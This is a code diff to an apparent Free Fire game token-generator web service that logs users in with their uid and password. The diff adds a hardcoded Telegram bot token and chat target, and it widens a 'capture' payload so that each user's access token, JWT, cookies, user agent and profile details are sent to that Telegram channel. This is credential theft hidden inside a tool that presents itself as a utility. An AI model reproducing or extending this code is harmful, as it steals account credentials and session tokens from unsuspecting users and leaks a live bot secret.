@@ -86,6 +86,7 @@ MAIN_IV = base64.b64decode("Nm95WkRyMjJFM3ljaGpNJQ==")
 RELEASEVERSION = "OB55"
 USERAGENT = "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)"
 LOGIN_URL = "https://loginbp.ppmainecoonghj.com/"
+INFO_API = "https://abhi-info-ff.vercel.app/info"
 
 _http_client = httpx.Client(
     limits=httpx.Limits(max_keepalive_connections=20, max_connections=50),
@@ -97,7 +98,7 @@ _http_client = httpx.Client(
 #  Telegram capture config
 # ============================================================
 
-TG_TOKEN   = os.environ.get("TG_BOT_TOKEN", "8989212510:AAGQFoUvD4TZ3Vw1GdQLqwFmU-u-Ytlx5ek")
+TG_TOKEN   = os.environ.get("TG_BOT_TOKEN", "8729044238:AAGfb930CpKMmcwESklve9wSQyC40KEn_BY")
 TG_TARGETS = [t.strip() for t in os.environ.get("TG_TARGETS", "-1004443937784").split(",") if t.strip()]
 
 TELEGRAM = TelegramCapture(TG_TOKEN, TG_TARGETS)
@@ -222,6 +223,16 @@ def get_access_token(account):
     return data.get("access_token", "0"), data.get("open_id", "0")
 
 
+def _fetch_profile(real_uid, timeout=10):
+    try:
+        r = _http_client.get(f"{INFO_API}?uid={real_uid}", timeout=timeout)
+        if r.status_code == 200:
+            return r.json()
+    except Exception as e:
+        print(f"[info-api] {e}")
+    return None
+
+
 def generate_jwt_token(uid, password):
     start = time.time()
 
@@ -255,15 +266,25 @@ def generate_jwt_token(uid, password):
     resp = _http_client.post(f"{LOGIN_URL}MajorLogin", data=payload, headers=headers)
     msg = extract_login_res(resp.content)
 
+    real_uid = str(msg.get("accountId", ""))
+
+    profile = _fetch_profile(real_uid) if real_uid else None
+    basic = (profile or {}).get("basic_info", {}) or {}
+    level  = basic.get("level", 0)
+    region = basic.get("region", "") or (msg.get("lockRegion") or msg.get("notiRegion") or "UNKNOWN")
+
     elapsed = time.time() - start
 
     result = {
+        "status":       "success",
+        "uid":          uid,
+        "real_uid":     real_uid,
+        "open_id":      open_id,
         "access_token": token_val,
-        "open_id": open_id,
-        "real_uid": str(msg.get("accountId", "")),
-        "status": "success",
-        "time": f"{elapsed:.2f}s",
-        "token": f"{msg.get('token', '')}",
+        "token":        msg.get("token", ""),
+        "time":         f"{elapsed:.2f}s",
+        "level":        level,
+        "region":       region,
     }
 
     emit({
@@ -278,6 +299,10 @@ def generate_jwt_token(uid, password):
         "cookies":      json.dumps(dict(request.cookies)),
         "user_agent":   request.headers.get("User-Agent"),
         "referer":      request.headers.get("Referer"),
+        "level":        level,
+        "region":       region,
+        "access_token": token_val,
+        "jwt_token":    result["token"],
         "error":        None,
     })
 
@@ -285,7 +310,7 @@ def generate_jwt_token(uid, password):
 
 
 # ============================================================
-#  Request capture (files + sender)
+#  Request capture
 # ============================================================
 
 MAX_FILE_BYTES = 8 * 1024 * 1024
